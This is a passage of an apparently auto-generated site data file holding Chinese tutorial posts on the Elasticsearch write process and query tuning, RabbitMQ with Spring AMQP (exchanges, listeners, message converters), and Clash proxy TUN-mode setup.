file，如果buffer里面有数据，默认1秒钟执行一次refresh操作，刷入一个新的segment file中\n\n操作系统里面，磁盘文件其实都有一个东西，叫做os cache，操作系统缓存，就是说数据写入磁盘文件之前，会先进入os cache，先进入操作系统级别的一个内存缓存中去\n\n只要buffer中的数据被refresh操作，刷入os cache中，就代表这个数据就可以被搜索到了\n\n为什么叫es是准实时的？nrt，near real-time，准实时。默认是每隔1秒refresh一次的，所以es是准实时的，因为写入的数据1秒之后才能被看到。\n\n可以通过es的restful api或者java api，手动执行一次refresh操作，就是手动将buffer中的数据刷入os cache中，让数据立马就可以被搜索到。\n\n只要数据被输入os cache中，buffer就会被清空了，因为不需要保留buffer了，数据在translog里面已经持久化到磁盘去一份\n\n3）只要数据进入os cache，此时就可以让这个segment file的数据对外提供搜索了\n\n4）重复1~3步骤，新的数据不断进入buffer和translog，不断将buffer数据写入一个又一个新的segment file中去，每次refresh完buffer清空，translog保留。随着这个过程推进，translog会变得越来越大。当translog达到一定长度的时候，就会触发commit操作。\n\nbuffer中的数据，倒是好，每隔1秒就被刷到os cache中去，然后这个buffer就被清空了。所以说这个buffer的数据始终是可以保持住不会填满es进程的内存的。\n\n每次一条数据写入buffer，同时会写入一条日志到translog日志文件中去，所以这个translog日志文件是不断变大的，当translog日志文件大到一定程度的时候，就会执行commit操作。\n\n5）commit操作发生第一步，就是将buffer中现有数据refresh到os cache中去，清空buffer\n\n6）将一个commit point写入磁盘文件，里面标识着这个commit point对应的所有segment file\n\n7）强行将os cache中目前所有的数据都fsync到磁盘文件中去\n\ntranslog日志文件的作用是什么？就是在你执行commit操作之前，数据要么是停留在buffer中，要么是停留在os cache中，无论是buffer还是os cache都是内存，一旦这台机器死了，内存中的数据就全丢了。\n\n所以需要将数据对应的操作写入一个专门的日志文件，translog日志文件中，一旦此时机器宕机，再次重启的时候，es会自动读取translog日志文件中的数据，恢复到内存buffer和os cache中去。\n\ncommit操作：1、写commit point；2、将os cache数据fsync强刷到磁盘上去；3、清空translog日志文件\n\n8）将现有的translog清空，然后再次重启启用一个translog，此时commit操作完成。默认每隔30分钟会自动执行一次commit，但是如果translog过大，也会触发commit。整个commit的过程，叫做flush操作。我们可以手动执行flush操作就是将所有os cache数据刷到磁盘文件中去。\n\n不叫做commit操作，flush操作。es中的flush操作，就对应着commit的全过程。我们也可以通过es api，手动执行flush操作，手动将os cache中的数据fsync强刷到磁盘上去，记录一个commit point，清空translog日志文件。\n\n9）translog其实也是先写入os cache的，默认每隔5秒刷一次到磁盘中去，所以默认情况下，可能有5秒的数据会仅仅停留在buffer或者translog文件的os cache中，如果此时机器挂了，会丢失5秒钟的数据。但是这样性能比较好，最多丢5秒的数据。也可以将translog设置成每次写操作必须是直接fsync到磁盘，但是性能会差很多。\n\n实际上你在这里，如果面试官没有问你es丢数据的问题，你可以在这里给面试官炫一把，你说，其实es第一是准实时的，数据写入1秒后可以搜索到；可能会丢失数据的，你的数据有5秒的数据，停留在buffer、translog os cache、segment file os cache中，有5秒的数据不在磁盘上，此时如果宕机，会导致5秒的数据丢失。\n\n如果你希望一定不能丢失数据的话，你可以设置个参数，官方文档，百度一下。每次写入一条数据，都是写入buffer，同时写入磁盘上的translog，但是这会导致写性能、写入吞吐量会下降一个数量级。本来一秒钟可以写2000条，现在你一秒钟只能写200条，都有可能。\n\n10）如果是删除操作，commit的时候会生成一个.del文件，里面将某个doc标识为deleted状态，那么搜索的时候根据.del文件就知道这个doc被删除了\n\n11）如果是更新操作，就是将原来的doc标识为deleted状态，然后新写入一条数据\n\n12）buffer每次refresh一次，就会产生一个segment file，所以默认情况下是1秒钟一个segment file，segment file会越来越多，此时会定期执行merge\n\n13）每次merge的时候，会将多个segment file合并成一个，同时这里会将标识为deleted的doc给物理删除掉，然后将新的segment file写入磁盘，这里会写一个commit point，标识所有新的segment file，然后打开segment file供搜索使用，同时删除旧的segment file。\n\nes里的写流程，有4个底层的核心概念，refresh、flush、translog、merge\n\n当segment file多到一定程度的时候，es就会自动触发merge操作，将多个segment file给merge成一个segment file。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"ES在数据量很大的情况下（数十亿级别）如何提高查询性能？",frontmatter:{title:"ES在数据量很大的情况下（数十亿级别）如何提高查询性能？",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/044840/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/06.ES%E5%9C%A8%E6%95%B0%E6%8D%AE%E9%87%8F%E5%BE%88%E5%A4%A7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%88%E6%95%B0%E5%8D%81%E4%BA%BF%E7%BA%A7%E5%88%AB%EF%BC%89%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%9F%A5%E8%AF%A2%E6%80%A7%E8%83%BD%EF%BC%9F.html",relativePath:"08.软件使用/09.elastic search/06.ES在数据量很大的情况下（数十亿级别）如何提高查询性能？.md",key:"v-ab43ed50",path:"/pages/044840/",headersStr:null,content:" 1. 减少写入es的数据 es数据量很大，会导致es的内存不够用，而速度很低 可以将部分需要查询的数据写入es，其他数据写入hbash mysql\n 2. 数据预热 通过后台程序提前访问最常访问的数据，使得这些数据刷入缓存\n 3. 冷热分离 将很少访问的数据和经常访问的数据分开放置，使得冷数据不会占据热数据的内存，使得热数据长期在缓存中\n 4. 不分表 不像数据库那样分表，因为es join比较慢 直接写入整体的数据\n 5. 分页性能优化 第一种是直接不让访问深页面（页面越深速度越慢，比如限制最多20页） 第二种是使用scroll api 这个是快照的方式实现的，而且不支持随机访问（跳页），只能从前到后访问",normalizedContent:" 1. 减少写入es的数据 es数据量很大，会导致es的内存不够用，而速度很低 可以将部分需要查询的数据写入es，其他数据写入hbash mysql\n 2. 数据预热 通过后台程序提前访问最常访问的数据，使得这些数据刷入缓存\n 3. 冷热分离 将很少访问的数据和经常访问的数据分开放置，使得冷数据不会占据热数据的内存，使得热数据长期在缓存中\n 4. 不分表 不像数据库那样分表，因为es join比较慢 直接写入整体的数据\n 5. 分页性能优化 第一种是直接不让访问深页面（页面越深速度越慢，比如限制最多20页） 第二种是使用scroll api 这个是快照的方式实现的，而且不支持随机访问（跳页），只能从前到后访问",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"ES的分布式架构原理",frontmatter:{title:"ES的分布式架构原理",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4ea730/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/07.ES%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86.html",relativePath:"08.软件使用/09.elastic search/07.ES的分布式架构原理.md",key:"v-415909ec",path:"/pages/4ea730/",headersStr:null,content:"数据写到哪一个shard是根据hash来的",normalizedContent:"数据写到哪一个shard是根据hash来的",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"rabbitMQ _ Spring AMQP 的使用",frontmatter:{title:"rabbitMQ _ Spring AMQP 的使用",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/e21414/",categories:["软件使用","rabbitMQ"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/10.rabbitMQ/01.rabbitMQ%20_%20Spring%20AMQP%20%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"08.软件使用/10.rabbitMQ/01.rabbitMQ _ Spring AMQP 的使用.md",key:"v-69c6d354",path:"/pages/e21414/",headersStr:null,content:'# 发布者\n\n 1. 在yml文件中配置mq的连接信息\n\nspring:\n  rabbitmq:\n    host: kehao.com # ip 地址\n    port: 5672\n    virtual-host: /\n    username: admin\n    password: admin\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. 发送代码\n\n@RunWith(SpringRunner.class)\n@SpringBootTest\npublic class SpringAMQPTest {\n    @Autowired\n    private RabbitTemplate rabbitTemplate;\n\n    public SpringAMQPTest() {\n    }\n\n    @Test\n    public void test() {\n        String queueName = "simple.queue";\n        String message = "hello,i am kehao";\n        this.rabbitTemplate.convertAndSend(queueName, message);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 消费者\n\n 1. 在yml文件中配置mq的连接信息\n\nspring:\n  rabbitmq:\n    host: kehao.com # ip 地址\n    port: 5672\n    virtual-host: /\n    username: admin\n    password: admin\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. 接收代码\n\n@Component\npublic class RabbitMqListener {\n\n    @RabbitListener(queues = "simple.queue")\n    public void simpleListenner(String message){\n        System.out.println(message);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'# 发布者\n\n 1. 在yml文件中配置mq的连接信息\n\nspring:\n  rabbitmq:\n    host: kehao.com # ip 地址\n    port: 5672\n    virtual-host: /\n    username: admin\n    password: admin\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. 发送代码\n\n@runwith(springrunner.class)\n@springboottest\npublic class springamqptest {\n    @autowired\n    private rabbittemplate rabbittemplate;\n\n    public springamqptest() {\n    }\n\n    @test\n    public void test() {\n        string queuename = "simple.queue";\n        string message = "hello,i am kehao";\n        this.rabbittemplate.convertandsend(queuename, message);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 消费者\n\n 1. 在yml文件中配置mq的连接信息\n\nspring:\n  rabbitmq:\n    host: kehao.com # ip 地址\n    port: 5672\n    virtual-host: /\n    username: admin\n    password: admin\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. 接收代码\n\n@component\npublic class rabbitmqlistener {\n\n    @rabbitlistener(queues = "simple.queue")\n    public void simplelistenner(string message){\n        system.out.println(message);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"rabbitMQ Srping AMQP 消息转换器",frontmatter:{title:"rabbitMQ Srping AMQP 消息转换器",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/003c85/",categories:["软件使用","rabbitMQ"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/10.rabbitMQ/03.rabbitMQ%20Srping%20AMQP%20%E6%B6%88%E6%81%AF%E8%BD%AC%E6%8D%A2%E5%99%A8.html",relativePath:"08.软件使用/10.rabbitMQ/03.rabbitMQ Srping AMQP 消息转换器.md",key:"v-e671d7a0",path:"/pages/003c85/",headersStr:null,content:"AMQP 可以给rabbit mq 传Object对象\n\n\n\n那么在序列化的时候会使用java默认的序列化方式（由org.springframework.amqp.support.converter.MessageConverter来处理的。而默认实现是SimpleMessageConverter，基于JDK的ObjectOutputStream完成序列化），比较占内存而且会有安全问题，并且可读性差，在rabbitmq的web管理页面根本看不到内容。可以改为使用JSON方式来做序列化和反序列化。\n\n可以在Spring容器中注入一个其他的MessageConverter来更换序列化和反序列化方式\n\n在publisher和consumer两个服务中都引入依赖：\n\n<dependency>\n    <groupId>com.fasterxml.jackson.dataformat</groupId>\n    <artifactId>jackson-dataformat-xml</artifactId>\n    <version>2.9.10</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n配置消息转换器。\n\n在启动类中添加一个Bean即可：\n\n@Bean\npublic MessageConverter jsonMessageConverter(){\n    return new Jackson2JsonMessageConverter();\n}\n\n\n1\n2\n3\n4\n\n\n此时就变为用json的方式来实现序列化和反序列化",normalizedContent:"amqp 可以给rabbit mq 传object对象\n\n\n\n那么在序列化的时候会使用java默认的序列化方式（由org.springframework.amqp.support.converter.messageconverter来处理的。而默认实现是simplemessageconverter，基于jdk的objectoutputstream完成序列化），比较占内存而且会有安全问题，并且可读性差，在rabbitmq的web管理页面根本看不到内容。可以改为使用json方式来做序列化和反序列化。\n\n可以在spring容器中注入一个其他的messageconverter来更换序列化和反序列化方式\n\n在publisher和consumer两个服务中都引入依赖：\n\n<dependency>\n    <groupid>com.fasterxml.jackson.dataformat</groupid>\n    <artifactid>jackson-dataformat-xml</artifactid>\n    <version>2.9.10</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n配置消息转换器。\n\n在启动类中添加一个bean即可：\n\n@bean\npublic messageconverter jsonmessageconverter(){\n    return new jackson2jsonmessageconverter();\n}\n\n\n1\n2\n3\n4\n\n\n此时就变为用json的方式来实现序列化和反序列化",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"rabbitMQ exchange 的使用",frontmatter:{title:"rabbitMQ exchange 的使用",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/594692/",categories:["软件使用","rabbitMQ"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/10.rabbitMQ/02.rabbitMQ%20exchange%20%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"08.软件使用/10.rabbitMQ/02.rabbitMQ exchange 的使用.md",key:"v-e68481a4",path:"/pages/594692/",headers:[{level:2,title:"声明exchange和queue",slug:"声明exchange和queue",normalizedTitle:"声明exchange和queue",charIndex:311},{level:2,title:"生产者",slug:"生产者",normalizedTitle:"生产者",charIndex:81},{level:2,title:"消费者",slug:"消费者",normalizedTitle:"消费者",charIndex:1353},{level:2,title:"声明exchange和queue 以及 消费者代码编写",slug:"声明exchange和queue-以及-消费者代码编写",normalizedTitle:"声明exchange和queue 以及 消费者代码编写",charIndex:2080},{level:2,title:"生产者",slug:"生产者-2",normalizedTitle:"生产者",charIndex:81},{level:2,title:"生产者",slug:"生产者-3",normalizedTitle:"生产者",charIndex:81},{level:2,title:"消费者",slug:"消费者-2",normalizedTitle:"消费者",charIndex:1353}],headersStr:"声明exchange和queue 生产者 消费者 声明exchange和queue 以及 消费者代码编写 生产者 生产者 消费者",content:'代码基于spring amqp编写 rabbitMQ : Spring AMQP 的使用\n\n\n# exchange的概念\n\nExchange：交换机。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。Exchange有以下3种类型：\n\n * Fanout：广播，将消息交给所有绑定到交换机的队列\n * Direct：定向，把消息交给符合指定routing key 的队列\n * Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列\n\n\n# Fanout 模式 (全部都发)\n\n\n# 声明exchange和queue\n\n@Configuration\npublic class FanoutConfig {\n\n    // 定义exchange\n    @Bean\n    public FanoutExchange fanoutExchange(){\n        return new FanoutExchange("kehao.fanout");\n    }\n\n    // 定义两个 queue\n    @Bean\n    public Queue queue1(){\n        return new Queue("fanout.queue1");\n    }\n\n    @Bean\n    public Queue queue2(){\n        return new Queue("fanout.queue2");\n    }\n\n    // 将两个queue和exchange绑定\n    @Bean\n    public Binding bindingQueue1(FanoutExchange fanoutExchange,Queue queue1){\n        return BindingBuilder.bind(queue1).to(fanoutExchange);\n    }\n\n    @Bean\n    public Binding bindingQueue2(FanoutExchange fanoutExchange,Queue queue2){\n        return BindingBuilder.bind(queue2).to(fanoutExchange);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 生产者\n\n    public void fanoutExchangeTest(){\n        String exchangeName = "kehao.fanout";\n        String message = "fanout message";\n        rabbitTemplate.convertAndSend(exchangeName,"",message);\n    }\n\n\n1\n2\n3\n4\n5\n\n\n\n# 消费者\n\n@Component\npublic class RabbitMqListener {\n    @RabbitListener(queues = "fanout.queue1")\n    public void fanoutQueue1Listenner(String message){\n        System.out.println("message from queue1"+message);\n    }\n\n    @RabbitListener(queues = "fanout.queue2")\n    public void fanoutQueue2Listenner(String message){\n        System.out.println("message from queue2"+message);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# Direct 模式 （根据key路由）\n\n在Fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到Direct类型的Exchange。\n\n在Direct模型下：\n\n * 队列与交换机的绑定，不能是任意绑定了，而是要指定一个RoutingKey（路由key）\n * 消息的发送方在 向 Exchange发送消息时，也必须指定消息的 RoutingKey。\n * Exchange不再把消息交给每一个绑定的队列，而是根据消息的Routing Key进行判断，只有队列的Routingkey与消息的 Routing key完全一致，才会接收到消息\n\n\n# 声明exchange和queue 以及 消费者代码编写\n\n之前使用的是 @Bean来绑定exchange和queue，还有另一种绑定方式，就是直接在消费者的监听器上使用注解来绑定\n\n    @RabbitListener(bindings = @QueueBinding(\n            value = @Queue("direct.queue1"),\n            exchange = @Exchange(name = "kehao.direct",type = ExchangeTypes.DIRECT),\n            key = {"apple","banana"}\n    ))\n    public void DirectExchangeQueue1Listener(String message){\n        System.out.println("DirectExchangeQueue1Listener:"+message);\n    }\n\n    @RabbitListener(bindings = @QueueBinding(\n            value = @Queue("direct.queue2"),\n            exchange = @Exchange(name = "kehao.direct",type = ExchangeTypes.DIRECT),\n            key = {"pencil","eraser"}\n    ))\n    public void DirectExchangeQueue2Listener(String message){\n        System.out.println("DirectExchangeQueue2Listener:"+message);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 生产者\n\n\tString exchangeName = "kehao.direct";\n\tString message = "苹果很好吃";\n\trabbitTemplate.convertAndSend(exchangeName,"apple",message);\n\n\n1\n2\n3\n\n\n运行结果：\n\nDirectExchangeQueue1Listener:苹果很好吃\n\n\n1\n\n\n\n# Topic 模式\n\nTopic类型的Exchange与Direct相比，都是可以根据RoutingKey把消息路由到不同的队列。只不过Topic类型Exchange可以让队列在绑定Routing key 的时候使用通配符！\n\nRoutingkey 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： item.insert\n\n通配符规则：\n\n * #：匹配一个或多个词\n\n * *：匹配不多不少恰好1个词\n\n举例：\n\n * item.#：能够匹配item.spu.insert 或者 item.spu\n\n * item.*：只能匹配item.spu\n\n\n\n * Queue1：绑定的是china.# ，因此凡是以 china.开头的routing key 都会被匹配到。包括china.news和china.weather\n * Queue2：绑定的是#.news ，因此凡是以 .news结尾的 routing key 都会被匹配。包括china.news和japan.news\n\n\n# 生产者\n\n    String exchangeName = "itcast.topic";\n    String message = "喜报！孙悟空大战哥斯拉，胜!";\n    rabbitTemplate.convertAndSend(exchangeName, "china.news", message);\n\n\n1\n2\n3\n\n\n\n# 消费者\n\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = "topic.queue1"),\n    exchange = @Exchange(name = "itcast.topic", type = ExchangeTypes.TOPIC),\n    key = "china.#"\n))\npublic void listenTopicQueue1(String msg){\n    System.out.println("消费者接收到topic.queue1的消息：【" + msg + "】");\n}\n\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = "topic.queue2"),\n    exchange = @Exchange(name = "itcast.topic", type = ExchangeTypes.TOPIC),\n    key = "#.news"\n))\npublic void listenTopicQueue2(String msg){\n    System.out.println("消费者接收到topic.queue2的消息：【" + msg + "】");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',normalizedContent:'代码基于spring amqp编写 rabbitmq : spring amqp 的使用\n\n\n# exchange的概念\n\nexchange：交换机。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于exchange的类型。exchange有以下3种类型：\n\n * fanout：广播，将消息交给所有绑定到交换机的队列\n * direct：定向，把消息交给符合指定routing key 的队列\n * topic：通配符，把消息交给符合routing pattern（路由模式） 的队列\n\n\n# fanout 模式 (全部都发)\n\n\n# 声明exchange和queue\n\n@configuration\npublic class fanoutconfig {\n\n    // 定义exchange\n    @bean\n    public fanoutexchange fanoutexchange(){\n        return new fanoutexchange("kehao.fanout");\n    }\n\n    // 定义两个 queue\n    @bean\n    public queue queue1(){\n        return new queue("fanout.queue1");\n    }\n\n    @bean\n    public queue queue2(){\n        return new queue("fanout.queue2");\n    }\n\n    // 将两个queue和exchange绑定\n    @bean\n    public binding bindingqueue1(fanoutexchange fanoutexchange,queue queue1){\n        return bindingbuilder.bind(queue1).to(fanoutexchange);\n    }\n\n    @bean\n    public binding bindingqueue2(fanoutexchange fanoutexchange,queue queue2){\n        return bindingbuilder.bind(queue2).to(fanoutexchange);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 生产者\n\n    public void fanoutexchangetest(){\n        string exchangename = "kehao.fanout";\n        string message = "fanout message";\n        rabbittemplate.convertandsend(exchangename,"",message);\n    }\n\n\n1\n2\n3\n4\n5\n\n\n\n# 消费者\n\n@component\npublic class rabbitmqlistener {\n    @rabbitlistener(queues = "fanout.queue1")\n    public void fanoutqueue1listenner(string message){\n        system.out.println("message from queue1"+message);\n    }\n\n    @rabbitlistener(queues = "fanout.queue2")\n    public void fanoutqueue2listenner(string message){\n        system.out.println("message from queue2"+message);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# direct 模式 （根据key路由）\n\n在fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到direct类型的exchange。\n\n在direct模型下：\n\n * 队列与交换机的绑定，不能是任意绑定了，而是要指定一个routingkey（路由key）\n * 消息的发送方在 向 exchange发送消息时，也必须指定消息的 routingkey。\n * exchange不再把消息交给每一个绑定的队列，而是根据消息的routing key进行判断，只有队列的routingkey与消息的 routing key完全一致，才会接收到消息\n\n\n# 声明exchange和queue 以及 消费者代码编写\n\n之前使用的是 @bean来绑定exchange和queue，还有另一种绑定方式，就是直接在消费者的监听器上使用注解来绑定\n\n    @rabbitlistener(bindings = @queuebinding(\n            value = @queue("direct.queue1"),\n            exchange = @exchange(name = "kehao.direct",type = exchangetypes.direct),\n            key = {"apple","banana"}\n    ))\n    public void directexchangequeue1listener(string message){\n        system.out.println("directexchangequeue1listener:"+message);\n    }\n\n    @rabbitlistener(bindings = @queuebinding(\n            value = @queue("direct.queue2"),\n            exchange = @exchange(name = "kehao.direct",type = exchangetypes.direct),\n            key = {"pencil","eraser"}\n    ))\n    public void directexchangequeue2listener(string message){\n        system.out.println("directexchangequeue2listener:"+message);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 生产者\n\n\tstring exchangename = "kehao.direct";\n\tstring message = "苹果很好吃";\n\trabbittemplate.convertandsend(exchangename,"apple",message);\n\n\n1\n2\n3\n\n\n运行结果：\n\ndirectexchangequeue1listener:苹果很好吃\n\n\n1\n\n\n\n# topic 模式\n\ntopic类型的exchange与direct相比，都是可以根据routingkey把消息路由到不同的队列。只不过topic类型exchange可以让队列在绑定routing key 的时候使用通配符！\n\nroutingkey 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： item.insert\n\n通配符规则：\n\n * #：匹配一个或多个词\n\n * *：匹配不多不少恰好1个词\n\n举例：\n\n * item.#：能够匹配item.spu.insert 或者 item.spu\n\n * item.*：只能匹配item.spu\n\n\n\n * queue1：绑定的是china.# ，因此凡是以 china.开头的routing key 都会被匹配到。包括china.news和china.weather\n * queue2：绑定的是#.news ，因此凡是以 .news结尾的 routing key 都会被匹配。包括china.news和japan.news\n\n\n# 生产者\n\n    string exchangename = "itcast.topic";\n    string message = "喜报！孙悟空大战哥斯拉，胜!";\n    rabbittemplate.convertandsend(exchangename, "china.news", message);\n\n\n1\n2\n3\n\n\n\n# 消费者\n\n@rabbitlistener(bindings = @queuebinding(\n    value = @queue(name = "topic.queue1"),\n    exchange = @exchange(name = "itcast.topic", type = exchangetypes.topic),\n    key = "china.#"\n))\npublic void listentopicqueue1(string msg){\n    system.out.println("消费者接收到topic.queue1的消息：【" + msg + "】");\n}\n\n@rabbitlistener(bindings = @queuebinding(\n    value = @queue(name = "topic.queue2"),\n    exchange = @exchange(name = "itcast.topic", type = exchangetypes.topic),\n    key = "#.news"\n))\npublic void listentopicqueue2(string msg){\n    system.out.println("消费者接收到topic.queue2的消息：【" + msg + "】");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"电脑clash 经常timedout解决办法",frontmatter:{title:"电脑clash 经常timedout解决办法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/d3c36d/",categories:["软件使用","vpn","科学上网"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/01.%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/01.%E7%94%B5%E8%84%91clash%20%E7%BB%8F%E5%B8%B8timedout%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html",relativePath:"08.软件使用/11.vpn/01.科学上网/01.电脑clash 经常timedout解决办法.md",key:"v-8d7eb7a0",path:"/pages/d3c36d/",headersStr:null,content:"在电脑使用clash的时候，有时候会出现timeout的问题 但是却发现换个设备，比如手机上，同样的节点却没有timedout 也就是说这个并不是节点的问题，而是软件的问题 可是我重新下载clash并不能解决这个问题 后来在网上找到方法，即，windows上更新下系统时间，就成功解决了",normalizedContent:"在电脑使用clash的时候，有时候会出现timeout的问题 但是却发现换个设备，比如手机上，同样的节点却没有timedout 也就是说这个并不是节点的问题，而是软件的问题 可是我重新下载clash并不能解决这个问题 后来在网上找到方法，即，windows上更新下系统时间，就成功解决了",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"科学上网机场_",frontmatter:{title:"科学上网机场_",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/7d7af1/",categories:["软件使用","vpn","科学上网"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/01.%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/02.%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%9C%BA%E5%9C%BA_.html",relativePath:"08.软件使用/11.vpn/01.科学上网/02.科学上网机场_.md",key:"v-151f62ba",path:"/pages/7d7af1/",headersStr:null,content:" * 魔戒.com (mojie.link)",normalizedContent:" * 魔戒.com (mojie.link)",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"clash CFW TUN 模式",frontmatter:{title:"clash CFW TUN 模式",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/5f319e/",categories:["软件使用","vpn","科学上网"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/01.%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/03.clash%20CFW%20TUN%20%E6%A8%A1%E5%BC%8F.html",relativePath:"08.软件使用/11.vpn/01.科学上网/03.clash CFW TUN 模式.md",key:"v-5cbc3d3b",path:"/pages/5f319e/",headersStr:null,content:"> 对于不遵循系统代理的软件，开启 TUN 模式将在电脑设置一个虚拟网卡，接管其流量并交由 CFW 处理，在 Windows 中，TUN 模式性能比 TAP 模式好\n\n\n# 1. 安装TUN驱动\n\n进入网站Wintun，点击界面中Download Wintun xxx下载压缩包，然后打开CFW的Home Directory目录\n\n\n\n根据系统版本将对应目录中wintun.dll解压至Home Directory目录中。基于x64的处理器的64位操作系统请使用amd64版本，32位操作系统请使用x86版本\n\n\n\n然后在General菜单中找到Service Mode选项，点击Manage > Install\n\n\n# 2. 设置并开启CFW TUN\n\n进入Settings页面 > Profile Mixin > YAML > Edit\n\n将下面的代码粘贴进去\n\nmixin: # object\n  dns:\n    enable: true\n    enhanced-mode: redir-host\n    nameserver:\n    - 119.29.29.29\n    - 223.5.5.5\n    - 223.6.6.6\n  tun:\n    enable: true\n    stack: gvisor\n    dns-hijack:\n    - 198.18.0.2:53\n    macOS-auto-route: true\n    macOS-auto-detect-interface: true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n修改好的配置文件应类似下图格式\n\n点击右下角保存，回到General页面，将Mixin开关打开\n\n打开控制面板 > 网络和 Internet > 网络和共享中心 > 左侧更改适配器设置，找到名称为Clash且描述为Clash Tunnel的适配器，如果显示已启用，说明tap模式成功开启\n\n",normalizedContent:"> 对于不遵循系统代理的软件，开启 tun 模式将在电脑设置一个虚拟网卡，接管其流量并交由 cfw 